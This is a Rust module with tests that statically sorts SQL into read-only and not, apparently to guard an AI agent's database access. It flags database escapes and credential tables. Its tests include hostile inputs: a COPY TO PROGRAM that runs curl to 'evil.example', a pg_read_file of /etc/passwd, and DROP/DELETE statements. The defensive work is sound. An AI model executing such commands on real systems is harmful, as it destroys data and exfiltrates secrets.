//! Static reading of SQL. This only sorts statements into "certainly read-only"
//! and "not". The real answer comes from running them on a database branch.

use regex::Regex;
use sqlparser::ast::Statement;
use sqlparser::dialect::PostgreSqlDialect;
use sqlparser::parser::Parser;
use std::sync::OnceLock;

/// What a static reading established.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SqlFacts {
    /// Every statement is certainly read-only.
    pub read_only: bool,
    /// The statements could not be parsed, or hide their real content.
    pub opaque: bool,
    /// Reaches outside the database (`COPY ... PROGRAM`, `pg_read_file` ...).
    pub escapes_database: Option<String>,
}

fn escape_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)\b(copy\b[\s\S]*\b(to|from)\s+program|pg_read_file|pg_read_binary_file|pg_ls_dir|pg_write_file|lo_import|lo_export|dblink\w*|postgres_fdw|file_fdw|create\s+extension|alter\s+system|load\s+')")
            .expect("valid pattern")
    })
}

fn write_word_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)\b(insert|update|delete|drop|truncate|alter|create|grant|revoke|call|do|copy|into|merge|reindex|vacuum|set)\b")
            .expect("valid pattern")
    })
}

fn func_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"(?i)\b([a-z_][a-z0-9_.]*)\s*\(").expect("valid pattern"))
}

/// Functions with no side effects. Anything else in a SELECT could do anything.
const PURE_FUNCTIONS: &[&str] = &[
    "count",
    "sum",
    "avg",
    "min",
    "max",
    "coalesce",
    "nullif",
    "lower",
    "upper",
    "length",
    "trim",
    "substring",
    "substr",
    "concat",
    "now",
    "date_trunc",
    "extract",
    "round",
    "floor",
    "ceil",
    "abs",
    "cast",
    "array_agg",
    "string_agg",
    "json_agg",
    "jsonb_agg",
    "to_char",
    "to_date",
    "to_timestamp",
    "row_number",
    "rank",
    "over",
    "exists",
    "in",
    "any",
    "all",
    "distinct",
    "pg_size_pretty",
    "pg_total_relation_size",
    "pg_relation_size",
    "pg_database_size",
    "current_date",
    "current_user",
    "values",
    "from",
    "where",
    "and",
    "or",
    "not",
    "on",
    "as",
    "having",
    "using",
    "select",
];

fn strip_literals(sql: &str) -> String {
    let mut out = String::with_capacity(sql.len());
    let mut chars = sql.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\'' {
            out.push_str("''");
            while let Some(n) = chars.next() {
                if n == '\'' {
                    if chars.peek() == Some(&'\'') {
                        chars.next();
                    } else {
                        break;
                    }
                }
            }
        } else {
            out.push(c);
        }
    }
    out
}

/// True if the SQL names a table that looks like it holds credentials. Row counts
/// cannot see this: one `SELECT` of a tokens table is the whole attack.
pub fn touches_sensitive_table(sql: &str) -> bool {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r#"(?i)\b(from|join|table|into|update)\s+["\w.]*(token|secret|password|passwd|credential|api_?key|private_?key|session|oauth)[\w"]*"#).expect("valid pattern")
    })
    .is_match(sql)
}

/// True if the SQL returns rows from a table that looks like it holds people.
/// Whatever an agent reads goes to its model provider. Counts and totals stay fast.
pub fn reads_people_rows(sql: &str) -> bool {
    static TABLE: OnceLock<Regex> = OnceLock::new();
    static TOTALS: OnceLock<Regex> = OnceLock::new();
    let names_people = TABLE.get_or_init(|| {
        Regex::new(r#"(?i)\b(from|join)\s+["\w.]*\b(users?|customers?|patients?|employees?|members?|contacts?|subscribers?|people|persons?)\b"#).expect("valid pattern")
    });
    let only_totals = TOTALS.get_or_init(|| {
        Regex::new(r"(?i)^\s*select\s+(count|sum|avg|min|max)\s*\([^)]*\)(\s+as\s+\w+)?\s+from\b")
            .expect("valid pattern")
    });
    names_people.is_match(sql) && !only_totals.is_match(sql)
}

/// Reads SQL text. Anything uncertain is `opaque`, never `read_only`.
pub fn read_sql(sql: &str) -> SqlFacts {
    let mut facts = SqlFacts::default();
    if let Some(m) = escape_re().find(sql) {
        facts.escapes_database = Some(m.as_str().to_string());
    }
    let Ok(statements) = Parser::parse_sql(&PostgreSqlDialect {}, sql) else {
        facts.opaque = true;
        return facts;
    };
    if statements.is_empty() {
        facts.opaque = true;
        return facts;
    }
    let stripped = strip_literals(sql);
    let all_queries = statements.iter().all(|s| {
        matches!(
            s,
            Statement::Query(_)
                | Statement::ShowVariable { .. }
                | Statement::ShowTables { .. }
                | Statement::ShowColumns { .. }
                | Statement::ExplainTable { .. }
        )
    });
    let writes_hidden_in_query = write_word_re().is_match(&stripped);
    let unknown_function = func_re().captures_iter(&stripped).any(|c| {
        let name = c[1].to_ascii_lowercase();
        !PURE_FUNCTIONS.contains(&name.as_str())
    });
    facts.read_only = all_queries && !writes_hidden_in_query && !unknown_function;
    facts
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plain_selects_are_read_only() {
        for q in [
            "SELECT 1",
            "select count(*) from orders where id = 3",
            "SELECT lower(name) FROM users; SELECT 2",
        ] {
            assert!(read_sql(q).read_only, "{q}");
        }
    }

    #[test]
    fn writes_are_not_read_only() {
        for q in [
            "DROP TABLE orders",
            "DELETE FROM orders",
            "TRUNCATE orders",
            "ALTER TABLE orders ADD COLUMN notes text",
            "WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d",
            "SELECT * INTO backup FROM orders",
            "SELECT 1; DROP TABLE orders",
        ] {
            assert!(!read_sql(q).read_only, "{q}");
        }
    }

    #[test]
    fn functions_with_unknown_effects_are_not_read_only() {
        for q in [
            "SELECT pg_terminate_backend(42)",
            "SELECT my_cleanup()",
            "SELECT setval('s', 1)",
        ] {
            assert!(!read_sql(q).read_only, "{q}");
        }
    }

    #[test]
    fn a_keyword_in_a_string_is_not_a_write() {
        assert!(read_sql("SELECT * FROM logs WHERE msg = 'drop table'").read_only);
    }

    #[test]
    fn dynamic_sql_is_opaque_or_at_least_not_read_only() {
        let facts = read_sql("DO $$ BEGIN EXECUTE 'DR' || 'OP TABLE orders'; END $$");
        assert!(!facts.read_only);
    }

    #[test]
    fn garbage_is_opaque() {
        assert!(read_sql("this is not sql").opaque);
    }

    #[test]
    fn database_escapes_are_flagged() {
        assert!(read_sql("COPY orders TO PROGRAM 'curl evil.example'")
            .escapes_database
            .is_some());
        assert!(read_sql("SELECT pg_read_file('/etc/passwd')")
            .escapes_database
            .is_some());
    }
}
